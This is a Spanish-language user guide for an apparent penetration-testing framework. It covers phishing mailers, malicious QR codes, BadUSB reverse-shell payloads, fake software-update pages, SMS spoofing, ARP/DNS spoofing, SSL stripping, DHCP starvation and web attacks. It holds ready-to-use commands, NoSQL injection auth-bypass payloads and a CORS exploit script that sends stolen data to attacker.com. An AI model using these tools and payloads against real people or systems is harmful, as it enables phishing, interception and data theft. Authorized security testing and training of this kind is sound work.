# KNDYS Framework v3.1 - Guía de Nuevos Módulos

## 📧 Social Engineering - Módulos SET-Inspired

### 1. mass_mailer - Campañas de Email Masivo

**Descripción**: Sistema de envío masivo de emails para campañas de phishing corporativo.

**Casos de uso**:
- Security awareness training
- Phishing simulations autorizadas
- Testing de filtros anti-spam

**Uso básico**:
```
use social/mass_mailer
set template invoice
set targets targets.csv
set smtp_server smtp.gmail.com
set delay 5
run
```

**Opciones**:
- `template`: invoice | shipping | password_reset | security_alert
- `targets`: Archivo CSV con emails (formato: email,name,company)
- `smtp_server`: Servidor SMTP a utilizar
- `delay`: Segundos entre envíos

**Templates disponibles**:
- **invoice**: Factura pendiente de pago
- **shipping**: Notificación de entrega de paquete
- **password_reset**: Solicitud de reset de contraseña
- **security_alert**: Alerta de actividad inusual

---

### 2. qr_generator - Códigos QR Maliciosos

**Descripción**: Genera códigos QR que redirigen a sitios de phishing.

**Casos de uso**:
- Physical security testing
- Parking lot drops
- Fake WiFi posters
- Fake payment terminals

**Uso básico**:
```
use social/qr_generator
set url http://phishing-site.com/login
set output qr_code.png
set size 500
run
```

**Instalación librería opcional**:
```bash
pip install qrcode[pil]
```

---

### 3. usb_payload - BadUSB/Rubber Ducky

**Descripción**: Genera payloads para dispositivos USB maliciosos.

**Casos de uso**:
- Physical penetration testing
- Red team engagements
- Security awareness sobre USB threats

**Uso básico**:
```
use social/usb_payload
set payload_type reverse_shell
set target_os windows
set lhost 192.168.1.100
set lport 4444
set output payload.txt
run
```

**Opciones**:
- `payload_type`: reverse_shell | credentials
- `target_os`: windows | linux
- `lhost`: IP del atacante (listener)
- `lport`: Puerto del listener

**Dispositivos compatibles**:
- USB Rubber Ducky
- Bash Bunny
- Teensy
- Arduino-based BadUSB

**Setup del listener**:
```
use exploit/multi_handler
set lhost 192.168.1.100
set lport 4444
run
```

---

### 4. fake_update - Páginas de Actualización Falsas

**Descripción**: Genera páginas web falsas de actualizaciones de software.

**Casos de uso**:
- Watering hole attacks
- User awareness training
- Social engineering simulations

**Uso básico**:
```
use social/fake_update
set software chrome
set payload update.exe
set port 8080
run
```

**Software soportado**:
- chrome
- firefox
- flash
- windows

**Deployment**:
```bash
# 1. Colocar payload malicioso
cp malware.exe fake_update_chrome/update.exe

# 2. Iniciar servidor
python3 -m http.server 8080 --directory fake_update_chrome

# 3. Acceder desde la víctima
# http://attacker-ip:8080
```

---

### 5. sms_spoofing - Campañas SMS

**Descripción**: Sistema completamente funcional de campañas SMS con integración Twilio API para envío real.

**Casos de uso**:
- Security awareness sobre smishing
- Testing de empleados (con autorización)
- Simulaciones de red team

**Uso básico**:
```
use social/sms_spoofing
set message "Your package is awaiting delivery"
set sender DHL
set targets phones.txt
run
```

**Formato archivo targets** (phones.txt):
```
+1234567890,John Doe
+0987654321,Jane Smith
```

**Características**:
- Integración completa con Twilio API
- Envío real de SMS con credenciales configurables
- Soporte para sender ID personalizado
- Variables dinámicas: {link}, {random}, {name}
- Control de delay entre mensajes
- Contador de éxito/fallos
- Creación automática de archivo de ejemplo

**Configuración Twilio**:
```bash
# Obtener credenciales en https://www.twilio.com/console
set twilio_sid <your_account_sid>
set twilio_token <your_auth_token>
set twilio_number <your_twilio_number>
```

---

### 6. pretexting - Escenarios de Ingeniería Social

**Descripción**: Generador de scripts para escenarios de pretexting.

**Casos de uso**:
- Entrenamiento de red team
- Social engineering awareness
- Vishing simulations

**Uso básico**:
```
use social/pretexting
set scenario it_support
set company SecureCorp
set urgency high
run
```

**Escenarios disponibles**:
- **it_support**: Soporte técnico IT
- **vendor**: Proveedor/Supplier
- **executive**: Asistente ejecutivo
- **hr**: Recursos humanos
- **security**: Oficial de seguridad

**Estructura del output**:
- Opening: Introducción del pretexto
- Urgency Factor: Razón de urgencia
- Primary Request: Solicitud principal
- Alternative Approach: Enfoque alternativo
- Tips: Consejos de ejecución

---

## 🌐 Network Attacks

### 1. arp_spoof - ARP Spoofing / MITM

**Descripción**: Ataque Man-in-the-Middle mediante ARP spoofing.

**Casos de uso**:
- Network security assessment
- MITM attack simulations
- Traffic interception testing

**Uso básico**:
```
use network/arp_spoof
set target_ip 192.168.1.50
set gateway_ip 192.168.1.1
set interface eth0
run
```

**Prerequisitos**:
```bash
# Habilitar IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Ejecutar como root
sudo python3 tt
```

**Módulos complementarios**:
```
use network/packet_sniffer  # Capturar tráfico
use network/ssl_strip       # Downgrade HTTPS
use network/dns_spoof       # Redirigir dominios
```

---

### 2. dns_spoof - DNS Spoofing

**Descripción**: Redirige consultas DNS a IPs falsas.

**Casos de uso**:
- Phishing via DNS poisoning
- Redirection attacks
- Network security testing

**Uso básico**:
```
use network/dns_spoof
set domain login.company.com
set fake_ip 192.168.1.100
set interface eth0
run
```

**Herramientas sugeridas**:
- dnsspoof (dsniff suite)
- Bettercap
- Scapy custom script

**⚠️ Requiere**: ARP spoofing activo primero

---

### 3. dhcp_starvation - Agotamiento DHCP

**Descripción**: Ataque DoS contra servidor DHCP.

**Uso básico**:
```
use network/dhcp_starvation
set interface eth0
set count 100
run
```

**Impacto**:
- Agota pool de direcciones DHCP
- Clientes legítimos no obtienen IP
- Prepara para rogue DHCP server

---

### 4. ssl_strip - SSL Stripping

**Descripción**: Downgrades HTTPS a HTTP para interceptar tráfico.

**Uso básico**:
```
use network/ssl_strip
set interface eth0
set port 8080
run
```

**Setup completo**:
```bash
# 1. IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. iptables redirect
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# 3. sslstrip
sslstrip -l 8080 -w sslstrip.log

# 4. ARP spoofing (en otro terminal)
use network/arp_spoof
```

**Limitación**: Navegadores modernos tienen HSTS protection.

---

### 5. packet_sniffer - Captura de Paquetes

**Descripción**: Sniffer avanzado con filtros BPF.

**Uso básico**:
```
use network/packet_sniffer
set interface eth0
set filter "tcp port 80"
set output capture.pcap
set count 1000
run
```

**Filtros BPF comunes**:
```
tcp port 80                    # HTTP traffic
tcp port 443                   # HTTPS traffic
tcp port 21 or tcp port 22     # FTP/SSH
udp port 53                    # DNS queries
host 192.168.1.100             # Specific host
net 192.168.1.0/24             # Entire network
```

**Análisis de capturas**:
```bash
# Wireshark
wireshark capture.pcap

# tshark
tshark -r capture.pcap

# NetworkMiner (extract files)
networkminer capture.pcap
```

---

## 🔐 Web Application Testing

### 1. jwt_cracker - JWT Security Tester

**Descripción**: Tester de seguridad para JSON Web Tokens.

**Casos de uso**:
- API security assessment
- Authentication bypass testing
- Weak secret detection

**Uso básico**:
```
use webapp/jwt_cracker
set token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0...
set wordlist secrets.txt
set algorithm HS256
run
```

**Ataques incluidos**:
1. **None Algorithm Attack**: Cambiar alg a "none"
2. **Algorithm Confusion**: RS256 → HS256
3. **Weak Secret Brute Force**: Diccionario de secretos comunes
4. **Payload Manipulation**: Modificar claims (user_id, role, etc.)

**Herramientas complementarias**:
- jwt_tool
- jwt.io (decoder online)
- hashcat (JWT cracking)

---

### 2. api_fuzzer - REST API Fuzzer

**Descripción**: Fuzzer para endpoints de APIs REST.

**Uso básico**:
```
use webapp/api_fuzzer
set url https://api.example.com
set method POST
set endpoints endpoints.txt
run
```

**Endpoints comunes a probar**:
```
/api/v1/users
/api/v1/admin
/api/internal
/api/debug
/.env
/api/swagger.json
/api/graphql
```

**Técnicas de fuzzing**:
- HTTP method fuzzing (GET, POST, PUT, DELETE, PATCH, OPTIONS)
- Path traversal (../../../etc/passwd)
- SQL injection en parámetros
- XXE en XML/JSON
- Authentication bypass
- IDOR vulnerabilities

---

### 3. cors_scanner - CORS Misconfiguration Scanner

**Descripción**: Detecta misconfiguraciones CORS.

**Uso básico**:
```
use webapp/cors_scanner
set url https://api.example.com
set origin https://evil.com
run
```

**Vulnerabilidades detectadas**:
- Wildcard CORS (Access-Control-Allow-Origin: *)
- Origin reflection (refleja cualquier origin)
- Credentials habilitados con wildcard
- Subdomain takeover via CORS

**Explotación**:
```html
<!-- evil.com -->
<script>
fetch('https://victim.com/api/sensitive', {
  credentials: 'include'
}).then(r => r.json())
  .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))
</script>
```

---

### 4. nosql_injection - NoSQL Injection Tester

**Descripción**: Tester de inyecciones NoSQL (MongoDB, CouchDB).

**Uso básico**:
```
use webapp/nosql_injection
set url http://api.example.com/login
set parameter username
set technique auth_bypass
run
```

**Payloads incluidos**:

**Authentication Bypass**:
```
username[$ne]=null&password[$ne]=null
username=admin&password[$ne]=1
username[$gt]=&password[$gt]=
```

**Blind Injection**:
```
username[$regex]=^a.*&password[$ne]=1
# Extraer password carácter por carácter
```

**Operadores MongoDB**:
```
$ne, $gt, $gte, $lt, $lte
$in, $nin, $regex, $where, $exists
```

---

### 5. graphql_introspection - GraphQL Schema Introspection

**Descripción**: Extrae schema completo de APIs GraphQL.

**Uso básico**:
```
use webapp/graphql_introspection
set url https://api.example.com/graphql
set output schema.json
run
```

**Query de introspección**: Extrae todos los types, fields, queries y mutations.

**Ataques GraphQL comunes**:
- Introspection (schema disclosure)
- Nested queries (DoS)
- Batch attacks
- Field suggestion abuse
- Authorization bypass

**Herramientas de análisis**:
- GraphQL Voyager (visualización de schema)
- Altair GraphQL Client
- InQL Scanner (Burp extension)

---

## 🎯 Escenarios Prácticos Corporativos

### Scenario 1: Security Awareness Campaign

**Objetivo**: Evaluar conciencia de empleados sobre phishing.

**Módulos a usar**:
```
# 1. Preparar campaña email
use social/mass_mailer
set template invoice
set targets employees.csv

# 2. Clonar sitio legítimo
use social/website_cloner
set url https://intranet.company.com/login

# 3. Generar QR codes para cafetería
use social/qr_generator
set url http://phishing.test.local
```

---

### Scenario 2: Network Security Assessment

**Objetivo**: Evaluar seguridad de red interna.

**Módulos a usar**:
```
# 1. ARP spoofing para MITM
use network/arp_spoof
set target_ip 192.168.1.50
set gateway_ip 192.168.1.1

# 2. Capturar tráfico
use network/packet_sniffer
set filter "tcp port 80 or tcp port 443"

# 3. SSL stripping
use network/ssl_strip

# 4. DNS spoofing
use network/dns_spoof
set domain login.company.com
```

---

### Scenario 3: Web Application Pentest

**Objetivo**: Pentesting de API moderna.

**Módulos a usar**:
```
# 1. Introspección GraphQL
use webapp/graphql_introspection
set url https://api.company.com/graphql

# 2. Test JWT
use webapp/jwt_cracker
set token <captured_jwt>

# 3. CORS testing
use webapp/cors_scanner
set url https://api.company.com

# 4. NoSQL injection
use webapp/nosql_injection
set url https://api.company.com/login

# 5. API fuzzing
use webapp/api_fuzzer
set url https://api.company.com
```

---

## 📚 Referencias

### Inspiración y Créditos
- **SET (Social Engineering Toolkit)** by TrustedSec
- **Metasploit Framework** by Rapid7
- **Bettercap** by @evilsocket
- **Burp Suite** by PortSwigger

### Recursos de Aprendizaje
- OWASP Testing Guide
- PTES (Penetration Testing Execution Standard)
- SANS SEC560: Network Penetration Testing
- Red Team Field Manual

### Comunidad
- r/netsec
- OWASP Community
- HackerOne / Bugcrowd

---

**KNDYS Framework v3.1**  
*Professional Penetration Testing*
